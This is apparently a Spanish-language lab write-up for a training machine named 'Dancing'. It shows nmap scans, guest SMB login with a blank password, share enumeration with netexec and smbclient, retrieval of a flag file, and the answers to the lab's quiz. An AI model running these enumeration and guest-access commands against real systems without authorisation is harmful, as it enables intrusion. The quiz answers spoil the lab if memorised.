[[SMB]] 
[[Anonymous]]

```java
IP atacante: 10.10.16.133
IP victima:  10.129.1.12
```

`$nmap -p- -Pn -n --min-rate 5000 10.129.1.12 -oG puertos`
```java
PORT      STATE    SERVICE
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
5985/tcp  open     wsman
6542/tcp  filtered unknown
9742/tcp  filtered unknown
12540/tcp filtered unknown
18153/tcp filtered unknown
22029/tcp filtered unknown
22036/tcp filtered unknown
30641/tcp filtered unknown
41398/tcp filtered unknown
42756/tcp filtered unknown
47001/tcp open     winrm
47508/tcp filtered unknown
48060/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
50978/tcp filtered unknown
53707/tcp filtered unknown
54597/tcp filtered unknown
56806/tcp filtered unknown
62649/tcp filtered unknown
```

Obtenemos muchos filtrados, nos limitamos a los abiertos:

`$nmap -p- --open -Pn -n --min-rate 5000 10.129.1.12 -oG OpenPorts`

Aún así en estos casos es bueno usar un script para copiar al portapapeles los puertos y evitar posibles errores:
```java
$bash tools/listPort.sh OpenPorts 
[+] Puertos copiados
```

Así es como obtenemos más fácil este comando:
`sudo nmap -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sSCV -v -A 10.129.1.12`
```java
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

`$nxc smb 10.129.1.12 -u 'guest' -p ''`
```java
SMB         10.129.1.12     445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:False) (SMBv1:False)
SMB         10.129.1.12     445    DANCING          [+] Dancing\guest: 
```

Nos atrevemos:
`$nxc smb 10.129.1.12 -u 'guest' -p '' --shares`
```java
...445    DANCING          [*] Windows 10 / Server 2019 ...
...
...445    DANCING          [*] Enumerated shares
...445    DANCING          Share           Permissions     Remark
...445    DANCING          -----           -----------     ------
...445    DANCING          ADMIN$                          Remote Admin
...445    DANCING          C$                              Default share
...445    DANCING          IPC$            READ            Remote IPC
...445    DANCING          WorkShares      READ,WRITE
```

Otra forma de listar, nadamás porque se pide en las preguntas, es con:
`smbclient -U 'guest' -L //10.129.1.12`
```java
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      

```

Ahora sí usamos `smbclient`
`$smbclient -U 'guest' //10.129.1.12/WorkShares`
```java
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 20 23:16:56 2025
  ..                                  D        0  Thu Mar 20 23:16:56 2025
  Amy.J                               D        0  Mon Mar 29 03:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021
```

Si buscamos en `\Amy.J\` obtenemos el archivo `worknotes.txt`, el cual adelanto que dice esto:
```java
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing 
```
Y si buscamos en `\James.P\` obtenemos `flag.txt`

Preguntas:
1. ¿Qué significa el acrónimo de 3 letras SMB?
	Server Message Block
2. ¿Qué puerto usa SMB para operar?
	445
3. ¿Cuál es el nombre del servicio del puerto 445 que apareció en nuestro análisis de Nmap?
	microsoft-ds
4. ¿Cuál es la bandera o switch que podemos usar con la utilidad smbclient para listar los recursos compartidos disponibles en Dancing?
	-L
5. ¿Cuántos recursos compartidos hay en Dancing?
	4
6. ¿Cómo se llama el recurso compartido al que finalmente podemos acceder con una contraseña en blanco?
	WorkShares
7. ¿Qué comando podemos usar dentro del shell de SMB para descargar los archivos que encontramos?
	get